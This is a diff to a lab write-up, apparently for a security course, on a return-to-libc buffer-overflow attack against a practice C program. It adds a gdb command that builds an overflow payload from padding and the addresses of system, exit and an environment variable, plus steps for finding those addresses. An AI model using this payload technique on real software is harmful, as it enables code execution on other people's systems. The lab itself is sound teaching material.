@@ -119,12 +119,35 @@ export exploit_path="/seclabs/bof/file_del"
 
 If we want to exploit
 
-68 bytes to overwrite buf and ebp
+20 bytes to overwrite buf and ebp
 4 bytes to overwrite ret addr of vuln with the address of system
 4 bytes for the address of exit
 4 bytes for argument of system (exploit path that we created before)
 
+```
+r $(python -c "print(20*'a' + 'address of system' + 'address of exit' + 'address of env var')")
+```
+
 ### 6. Use gdb
+
+Use gdb for this c program
+
+```
+gdb -q lab1.out
+```
+Start the code
+```
+start
+```
+Print out the address of those things
+```
+print system
+print exit
+find /home/seed/seclabs/bof/midterm/file_copy
+```
+
+![image](https://github.com/user-attachments/assets/30d8405e-cd3a-4476-a6fc-4f1a5c8a43f6)
+
 ### 7. Attack File
 
 
